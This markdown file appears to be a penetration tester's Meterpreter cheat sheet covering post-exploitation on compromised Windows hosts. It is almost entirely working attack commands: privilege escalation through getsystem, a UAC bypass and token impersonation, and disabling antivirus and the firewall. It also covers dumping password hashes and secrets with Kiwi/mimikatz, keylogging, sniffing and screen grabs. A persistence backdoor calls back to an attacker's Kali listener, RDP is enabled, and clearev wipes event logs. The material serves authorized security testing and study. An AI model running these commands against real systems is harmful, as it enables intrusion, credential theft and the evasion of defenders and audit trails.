
# Meterpreter
https://pentestmag.com/metasploit-cheat-sheet/
https://github.com/security-cheatsheet/metasploit-cheat-sheet

--------------------------------------------------------------------------

## Enumerate

- ### General

    - Get system info
    
          sysinfo
    
    - Get user info
    
          getuid

    - Enumerate privileges

          getprivs
          
    - Get environment variables
    
          getenv <env_variable>
    
    - Enumerate drives
    
          show_mount
    
    - List processes
    
          ps

- ### Windows

    - Enumerate privileges (Windows)
    
          use post/windows/gather/win_privs
    
    - Enumerate logged on users (Windows)
    
          use post/windows/gather/enum_logged_on_users
          
    - Enumerate installed applications (Windows)
    
          use post/windows/gather/enum_applications
    
    - Enumerate AV excluded paths (Windows)
    
          use post/windows/gather/enum_av_excluded
    
    - Enumerate other computers on the LAN (Windows)
    
          use post/windows/gather/enum_computers
    
    - Enumerate shares (Windows)
    
          use post/windows/gather/enum_shares

    - Enumerate installed patches (Windows)

          use post/windows/gather/enum_patches


--------------------------------------------------------------------------

--------------------------------------------------------------------------

## Privesc

- ### General

    - Migrate to process with higher privileges
    
          migrate <pid>
    
    - Attempt automated privesc
    
          getsystem
    	
    - Search for exploits for a session
    
          use post/multi/recon/local_exploit_suggester

    - Disable antivirus
    
          run killav

- ### Windows

    - Bypass UAC (Windows x64)
          
          search UAC
          use exploit/windows/local/bypassuac_injection
          <set options>
          run
          getsystem
    
    - Impersonate windows access tokens (Windows)

        - list tokens

              load incognito
              list_tokens -u

        - impersonate token

              impersonate_token <token>
              getuid          

    - Disable antivirus

          run post/windows/manage/killav
    
    - Disable windows firewall (Windows)
    
          shell
          netsh firewall set opmode mode=disable

--------------------------------------------------------------------------

## Loot

- ### General
- 
- Dump hashes

    - basic hash dump

          run hashdump
      
- Key logging

    - start

          keyscan start
	
    - view

          keyscan dump

- Sniffing packets

    - enable sniffer
	  
          use sniffer
	  
    - list interfaces
	
          sniffer_interfaces
	  
    - start sniffer

          sniffer_start <target_inteface> <#_of_packets> 
	  
    - dump sniffed traffic to pcap

          sniffer_dump <interface> <file.cap>

- ### Windows

    - Dump hashes

        - basic

              run post/windows/gather/smart_hashdump

        - mimikatz/Kiwi (Windows)
    
              load kiwi
              creds_all
              lsa_dump_sam
              lsa_dump_secrets

    - Screen grab
    
          use espia
          screengrab

--------------------------------------------------------------------------

## Persistence

- Persistance RAT

      run persistence -h
	
      run persistence -A -i 20 -p <listening_port>
      run persistence -U -i 20 -p <listening_port>

Next time we need to login and access the RAT, we only need to load up the Metasploit multi handler and set the parameters (LPORT 666, LHOST <Kali_IP>, and RHOST <Windows_IP>. We will also have to set the payload to the corresponding payload inside of a Metasploit handler from task one. If we were remote, we would use the portfwd command to port forward, but again that is out of scope. 

- Enable RDP (Windows)

      use post/windows/manage/enable_rdp

--------------------------------------------------------------------------

## Cleanup

- Clear logs

      clearev

--------------------------------------------------------------------------